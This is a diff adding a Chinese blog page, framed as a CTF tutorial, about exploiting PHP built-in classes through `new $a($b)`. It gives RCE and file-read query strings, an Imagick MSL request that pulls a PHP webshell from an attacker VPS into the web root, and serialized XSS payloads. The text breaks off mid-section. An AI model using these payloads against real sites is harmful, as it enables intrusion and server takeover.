@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        php原生类 | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">php原生类</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/php%E5%AE%89%E5%85%A8/" class="post-tag">#php安全</a>
+  
+
+
+          <span class="post-date">2023-05-28</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Enew-a-b"><span class="toc-text">关于new $a($b)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#eval-%E2%80%9Cecho-new-a-b-%E2%80%9D"><span class="toc-text">eval(“echo new $a($b);”)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#echo-new-a-b"><span class="toc-text">echo new $a($b)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#new-a-b"><span class="toc-text">new $a($b)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Error-Exception%E5%86%85%E7%BD%AE%E7%B1%BB%E8%BF%9B%E8%A1%8CXSS"><span class="toc-text">使用Error&#x2F;Exception内置类进行XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-text">Error 内置类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exception-%E5%86%85%E7%BD%AE%E7%B1%BB"><span class="toc-text">Exception 内置类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Error-Exception%E5%86%85%E7%BD%AE%E7%B1%BB%E7%BB%95%E8%BF%87%E5%93%88%E5%B8%8C%E6%AF%94%E8%BE%83"><span class="toc-text">使用Error&#x2F;Exception内置类绕过哈希比较</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-%E7%B1%BB"><span class="toc-text">Error 类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exception-%E7%B1%BB"><span class="toc-text">Exception 类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF"><span class="toc-text">使用SoapClient类进行SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SoapClient-%E7%B1%BB"><span class="toc-text">SoapClient 类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-DirectoryIterator-%E7%B1%BB%E7%BB%95%E8%BF%87-open-basedir"><span class="toc-text">使用 DirectoryIterator 类绕过 open_basedir</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8SimpleXMLElement%E7%B1%BB%E8%BF%9B%E8%A1%8CXXE"><span class="toc-text">使用SimpleXMLElement类进行XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SimpleXMLElement"><span class="toc-text">SimpleXMLElement</span></a></li></ol></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <h1 id="关于new-a-b"><a href="#关于new-a-b" class="headerlink" title="关于new $a($b)"></a>关于new $a($b)</h1><p>CTF赛题中，常常会出现形如echo new $a($b)这⼀类的代码，其中$a和$b是⽤户可控的，⽽最终的利用点是在echo new $a($b)这⾥</p>
+<h2 id="eval-“echo-new-a-b-”"><a href="#eval-“echo-new-a-b-”" class="headerlink" title="eval(“echo new $a($b);”)"></a>eval(“echo new $a($b);”)</h2><p>这⼀类代码是最简单的，很轻松就能RCE，样例代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$a</span>(<span class="subst">$b</span>);&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>给a随便传⼀个原⽣类，给b传恶意命令即可：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="built_in">Exception</span>&amp;b=system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">?a=<span class="built_in">SplFileObject</span>&amp;b=system(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="echo-new-a-b"><a href="#echo-new-a-b" class="headerlink" title="echo new $a($b)"></a>echo new $a($b)</h2><p>这是在各⼤⽐赛中常考的，正因为常考，许多⼤师傅都在挖掘可被利⽤的原⽣类，⽐如：</p>
+<p>遍历⽬录类：</p>
+<ul>
+<li><p>DirectoryIterator</p>
+</li>
+<li><p>GlobIterator</p>
+</li>
+<li><p>FilesystemIterator</p>
+</li>
+</ul>
+<p>读取⽂件类：</p>
+<ul>
+<li>SplFileObject（同样也能⽤作SSRF）</li>
+</ul>
+<p>通常在CTF中的考法是：</p>
+<ol>
+<li><p>flag放在根⽬录下，且名字为为f13gggg这种不能被猜测的</p>
+</li>
+<li><p>flag通常不在同⼀⾏，考察选⼿是否会⽤伪协议去读取</p>
+</li>
+</ol>
+<p>⽐如下⽅代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
+
+<p>针对这样的代码，读flag的操作步骤如下：</p>
+<p>⾸先⽤能遍历⽬录的原⽣类，⽐如DirectoryIterator结合glob读⽂件名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="built_in">DirectoryIterator</span>&amp;b=glob:<span class="comment">//f*</span></span><br></pre></td></tr></table></figure>
+
+<p>读到f1ag.php，由于DirectoryIterator返回结果是⼀个迭代器，所以通常直接⽤echo打印出来的是第⼀</p>
+<p>项，所以需要结合glob协议通配符的特性去⼀点点把flag⽂件名匹配出来</p>
+<p>然后⽤SplFileObject去读⽂件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="built_in">SplFileObject</span>&amp;b=f1ag.php</span><br></pre></td></tr></table></figure>
+
+<p>看到下⽅的结果，就只读了⽂件的第⼀⾏</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242216016.webp" alt="image-20230524221616805"></p>
+<p>因此需要使⽤伪协议将其读出来：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="built_in">SplFileObject</span>&amp;b=php:<span class="comment">//filter/convert.base64-encode/resource=f1ag.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="new-a-b"><a href="#new-a-b" class="headerlink" title="new $a($b)"></a>new $a($b)</h2><p>那么问题来了，如果没有echo呢？虽然代码会执⾏，但是我们拿不到结果，并且echo new $a($b);其实</p>
+<p>也没有从根本上解决RCE这件事，⼤多CTF题都仅限于找⽂件名、读⽂件这⼀步。那假如说flag在环境变</p>
+<p>量中呢？⼜或者说读flag需要suid提权等操作？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/">https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/</a></p>
+<p>经过测试之后存在</p>
+<p>Imagick类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b=Imagick&amp;c=http:<span class="comment">//ip:7777</span></span><br></pre></td></tr></table></figure>
+
+<p>按照⽂中的POC，在VPS中⽣成⼀个图⽚，含有⼀句话⽊⻢</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">convert xc:red -set &#x27;Copyright&#x27; &#x27;&lt;?php @eval(@$_REQUEST[&quot;a&quot;]); ?&gt;&#x27; positiv</span><br><span class="line">e.png</span><br></pre></td></tr></table></figure>
+
+<p>在VPS中监听12345端⼝，再往服务器发送请求包如下：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?b=Imagick&amp;c=vid:msl:/tmp/php*</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.1.1.1:32127</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/53</span><br><span class="line">7.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,i</span><br><span class="line">mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryeTvfNEmq</span><br><span class="line">Tayg6bqr</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>348</span><br><span class="line">------WebKitFormBoundaryeTvfNEmqTayg6bqr</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;123&quot;; filename=&quot;exec.msl&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;image&gt;</span><br><span class="line">&lt;read filename=&quot;http://vps:12345/positive.png&quot; /&gt;</span><br><span class="line">&lt;write filename=&quot;/var/www/html/positive.php&quot;/&gt;</span><br><span class="line">&lt;/image&gt;</span><br><span class="line">------WebKitFormBoundaryeTvfNEmqTayg6bqr--</span><br></pre></td></tr></table></figure>
+
+<p>发送后，靶机就往VPS中请求了该⽂件，并且把该⽂件下载到了指定⽬录</p>
+<p>访问后即可RCE</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305242221887.webp" alt="image-20230524222151676"></p>
+<p>以上没有讲解原理，不过还是分析⼀下这种⼿法的限制：</p>
+<ol>
+<li>需要通⽹，当然如果不通⽹这种⼿法也存在⼀个重命名⽂件的功能，如果⽹站有上传功能可以利⽤</li>
+</ol>
+<p>这个⼿法将恶意的JPG重命名成PHP</p>
+<ol start="2">
+<li><p>需要知道⽹站的⽬录（⽐赛中通常是/var/www/html或者/app这类）</p>
+</li>
+<li><p>需要在⽹站⽬录下有写权限，当然如果知道类似于upload这种⽂件夹的路径也可以（因为通常它们</p>
+</li>
+</ol>
+<p>是可写的</p>
+<ol start="4">
+<li>最最重要的：需要有装Imagick扩展，该扩展其实不是默认⾃带的（⼀定程度上限制了攻击⾯），不</li>
+</ol>
+<p>过和出题⼈@M0th短暂的交流了⼀下，出题⼈表示：实际⽹站应⽤也挺多。攻击⾯这个维度还有待</p>
+<p>考证</p>
+<h1 id="使用Error-Exception内置类进行XSS"><a href="#使用Error-Exception内置类进行XSS" class="headerlink" title="使用Error/Exception内置类进行XSS"></a>使用Error/Exception内置类进行XSS</h1><h2 id="Error-内置类"><a href="#Error-内置类" class="headerlink" title="Error 内置类"></a>Error 内置类</h2><ul>
+<li>适用于php7版本</li>
+<li>在开启报错的情况下</li>
+</ul>
+<p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这是一种挖洞的新思路。</p>
+<p>下面演示如何使用 Error 内置类来构造 XSS。</p>
+<p>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);<span class="keyword">echo</span> <span class="variable">$a</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）</p>
+<p>给出POC：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<span class="variable">$b</span> = serialize(<span class="variable">$a</span>);<span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);  <span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Exception-内置类"><a href="#Exception-内置类" class="headerlink" title="Exception 内置类"></a>Exception 内置类</h2><ul>
+<li>适用于php5、7版本</li>
+<li>开启报错的情况下</li>
+</ul>
+<p>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);<span class="keyword">echo</span> <span class="variable">$a</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>给出POC：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<span class="variable">$b</span> = serialize(<span class="variable">$a</span>);<span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);  <span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="使用Error-Exception内置类绕过哈希比较"><a href="#使用Error-Exception内置类绕过哈希比较" class="headerlink" title="使用Error/Exception内置类绕过哈希比较"></a><strong>使用Error/Exception内置类绕过哈希比较</strong></h1><p>在上文中，我们已经认识了Error和Exception这两个PHP内置类，但对他们妙用不仅限于 XSS，还可以通过巧妙的构造绕过md5()函数和sha1()函数的比较。这里我们就要详细的说一下这个两个错误类了。</p>
+<h2 id="Error-类"><a href="#Error-类" class="headerlink" title="Error 类"></a>Error 类</h2><p><strong>Error</strong> 是所有PHP内部错误类的基类，该类是在PHP 7.0.0 中开始引入的。</p>
+<p><strong>类摘要：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">  <span class="comment">/* 属性 */</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">  <span class="comment">/* 方法 */</span></span><br><span class="line">  <span class="keyword">public</span> __construct ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getMessage ( ) : <span class="keyword">string</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getPrevious ( ) : <span class="built_in">Throwable</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getCode ( ) : <span class="keyword">mixed</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getFile ( ) : <span class="keyword">string</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getLine ( ) : <span class="keyword">int</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getTrace ( ) : <span class="keyword">array</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getTraceAsString ( ) : <span class="keyword">string</span></span><br><span class="line">  <span class="keyword">public</span> __toString ( ) : <span class="keyword">string</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">private</span> __clone ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>类属性：</strong></p>
+<ul>
+<li>message：错误消息内容</li>
+<li>code：错误代码</li>
+<li>file：抛出错误的文件名</li>
+<li>line：抛出错误在该文件中的行数</li>
+</ul>
+<p><strong>类方法：</strong></p>
+<ul>
+<li><code>Error::__construct</code> — 初始化 error 对象</li>
+<li><code>Error::getMessage</code> — 获取错误信息</li>
+<li><code>Error::getPrevious</code> — 返回先前的 Throwable</li>
+<li><code>Error::getCode</code> — 获取错误代码</li>
+<li><code>Error::getFile</code> — 获取错误发生时的文件</li>
+<li><code>Error::getLine</code> — 获取错误发生时的行号</li>
+<li><code>Error::getTrace</code> — 获取调用栈（stack trace）</li>
+<li><code>Error::getTraceAsString</code> — 获取字符串形式的调用栈（stack trace）</li>
+<li><code>Error::__toString</code> — error 的字符串表达</li>
+<li><code>Error::__clone</code> — 克隆 error</li>
+</ul>
+<h2 id="Exception-类"><a href="#Exception-类" class="headerlink" title="Exception 类"></a>Exception 类</h2><p><strong>Exception</strong> 是所有异常的基类，该类是在PHP 5.0.0 中开始引入的。</p>
+<p><strong>类摘要：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Exception</span> &#123;</span><br><span class="line">  <span class="comment">/* 属性 */</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">  <span class="comment">/* 方法 */</span></span><br><span class="line">  <span class="keyword">public</span> __construct ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getMessage ( ) : <span class="keyword">string</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getPrevious ( ) : <span class="built_in">Throwable</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getCode ( ) : <span class="keyword">mixed</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getFile ( ) : <span class="keyword">string</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getLine ( ) : <span class="keyword">int</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getTrace ( ) : <span class="keyword">array</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">public</span> getTraceAsString ( ) : <span class="keyword">string</span></span><br><span class="line">  <span class="keyword">public</span> __toString ( ) : <span class="keyword">string</span></span><br><span class="line">  <span class="keyword">final</span> <span class="keyword">private</span> __clone ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>类属性：</strong></p>
+<ul>
+<li>message：异常消息内容</li>
+<li>code：异常代码</li>
+<li>file：抛出异常的文件名</li>
+<li>line：抛出异常在该文件中的行号</li>
+</ul>
+<p><strong>类方法：</strong></p>
+<ul>
+<li><code>Exception::__construct</code> — 异常构造函数</li>
+<li><code>Exception::getMessage</code> — 获取异常消息内容</li>
+<li><code>Exception::getPrevious</code> — 返回异常链中的前一个异常</li>
+<li><code>Exception::getCode</code> — 获取异常代码</li>
+<li><code>Exception::getFile</code> — 创建异常时的程序文件名称</li>
+<li><code>Exception::getLine</code> — 获取创建的异常所在文件中的行号</li>
+<li><code>Exception::getTrace</code> — 获取异常追踪信息</li>
+<li><code>Exception::getTraceAsString</code> — 获取字符串类型的异常追踪信息</li>
+<li><code>Exception::__toString</code> — 将异常对象转换为字符串</li>
+<li><code>Exception::__clone</code> — 异常克隆</li>
+</ul>
+<p>我们可以看到，在Error和Exception这两个PHP原生类中内只有 <code>__toString</code> 方法，这个方法用于将异常或错误对象转换为字符串。</p>
+<p>我们以Error为例，我们看看当触发他的 <code>__toString</code> 方法时会发生什么：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
+
+<p>输出如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span>: payload in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现这将会以字符串的形式输出当前报错，包含当前的错误信息（”payload”）以及当前报错的行号（”2”），而传入 <code>Error(&quot;payload&quot;,1)</code> 中的错误代码“1”则没有输出出来。</p>
+<p>在来看看下一个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure>
+
+<p>输出如下：</p>
